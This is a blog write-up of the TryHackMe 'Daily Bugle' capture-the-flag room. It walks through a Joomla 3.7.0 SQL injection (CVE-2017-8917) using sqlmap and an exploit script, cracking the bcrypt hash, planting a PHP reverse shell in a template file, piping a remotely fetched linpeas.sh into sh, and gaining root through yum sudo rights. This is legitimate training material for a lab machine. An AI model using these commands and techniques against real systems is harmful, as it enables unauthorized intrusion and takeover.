---
title: TryHackMe - Daily Bugle
layout: post
categories:
- TryHackMe
tag:
- sqli,
- yum,
- joomla
image: "/assets/img/daily-bugle.png"
image_alt: daily-bugle
---

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges.

<br>

## 1. Deploy

Deploy the machine - it may take up to 2 minutes to configure. 

<br>

### 1.1 Access the web server, who robbed the bank?

As usual, let's do a nmap scan first.

```
$ nmap -sSV 10.10.139.115
```

![nmap](/assets/img/tryhackme/daily-bugle/nmap.png)

We found three open port. Theese are 22/tcp SSH, 80/tcp HTTP and 3306/tcp MYSQL.

Let's visit the homepage. Let's see what we can find.

We found the robber. It's a spiderman.

![home](/assets/img/tryhackme/daily-bugle/home.png)

**Answer: `spiderman`**

<br>

---

<br>

## 2. Obtain User and Root

Hack into the machine and obtain the root user's credentials.

<br>

### 2.1 What is the Joomla version?

Now, let's do a gobuster scan.

```
$ gobuster dir -u http://10.10.139.115/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster](/assets/img/tryhackme/daily-bugle/gobuster.png)

Let's do a scan using joomscan to find the Joomla version.

```
$ joomscan --url http://10.10.139.115/
```

![joomscan](/assets/img/tryhackme/daily-bugle/joomscan.png)

We found the Joomla version. It is 3.7.0.

**Answer: `3.7.0`**

<br>

_Instead of using SQLMap, why not use a python script!_

### 2.2 What is Jonah's cracked password?

With the Joomla version we found, we now search in exploit-db and see if we can find anything. 

![search](/assets/img/tryhackme/daily-bugle/search.png)

Yes, we found the vulnerability. [CVE-2017-8917](https://www.exploit-db.com/exploits/42033).

![db](/assets/img/tryhackme/daily-bugle/db.png)

You can progress using **`sqlmap`** here, but I will use a python script written for faster results. Still below is the code for sqlmap

![sql](/assets/img/tryhackme/daily-bugle/sql.png)

```
$ sqlmap -u "http://10.10.139.115/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![sqlmap](/assets/img/tryhackme/daily-bugle/sqlmap.png)

I will use the python script [here](https://github.com/stefanlucas/Exploit-Joomla).

```
$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
$ python joomblah http://10.10.139.115/
```

![joomblah](/assets/img/tryhackme/daily-bugle/joomblah.png)

We found this hash code for Jonah's password.

```
> $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

Let's crack this hash.

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash
```

![john](/assets/img/tryhackme/daily-bugle/john.png)


**Answer: `s********123`**

<br>

### 2.3 What is the user flag?

Go to the administrator directory and login with **`jonah:s********123`**

We are looking for a suitable place for any reverse shell. We go to where the .php pages are located.

First, we click on **`Templates`** from the left sidebar.

![step1](/assets/img/tryhackme/daily-bugle/step1.png)

Then we click on **`Templates`**  again on the page we go to.

![step2](/assets/img/tryhackme/daily-bugle/step2.png)

Then we click on **`Beez3 Details and Files`**.

![step3](/assets/img/tryhackme/daily-bugle/step3.png)

And we have reached the source files, and from here we can put our reverse shell in the index.php file.
You can find the reverse shell [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).

![step4](/assets/img/tryhackme/daily-bugle/step4.png)

Don't forget to change this.

![change](/assets/img/tryhackme/daily-bugle/change.png)

Now, we modify the contents of index.php.

![index](/assets/img/tryhackme/daily-bugle/index.png)

We set up a netcat listener before opening the index.php page.

```
$ nc -nlvp 4444
```

Now browse [http://10.10.139.115/templates/beez3/index.php](http://10.10.139.115/templates/beez3/index.php) and you should get a reverse shell.

And we are inside.

![in](/assets/img/tryhackme/daily-bugle/in.png)

The first thing on the server was to list the /home directory and find users.

![ls](/assets/img/tryhackme/daily-bugle/ls.png)

I tried to enter the jjameson directory but it didn't work. So I decided to download [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/20230312) and run it on the target machine.

First I set up my own machine. I am running the following code in the directory where the linpeas.sh file is located.

```
$ sudo python -m http.server 80
```

Then I run the following code on the target machine.

```
$ curl 10.8.86.168/linpeas.sh | sh 
```

And it worked, let's see what we find.

![run](/assets/img/tryhackme/daily-bugle/run.png)

We found a password but I have no idea what password it is.

![pass](/assets/img/tryhackme/daily-bugle/pass.png)

Let's try it for jjameson.

![jj](/assets/img/tryhackme/daily-bugle/jj.png)

We also found the jjameson password**`(**********)`**

Now we can go to the jjameson directory and get the user flag.

```
$ cd /home/jjameson
$ ls -la
$ cat user.txt
```

![user](/assets/img/tryhackme/daily-bugle/user.png)

<br>

### 2.4 What is the root flag?

Now, I check by doing `sudo -l`.

![yum](/assets/img/tryhackme/daily-bugle/yum.png)

I'm looking at [gftobins](https://gtfobins.github.io/gtfobins/yum/) to get root privileges using yum.

And let's try this.

![gtfobins](/assets/img/tryhackme/daily-bugle/gtfobins.png)

Yes, it worked.

![privesc](/assets/img/tryhackme/daily-bugle/privesc.png)

```
$ cd /root
$ ls -la
$ cat root.txt
```

![root](/assets/img/tryhackme/daily-bugle/root.png)

<br>

---

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
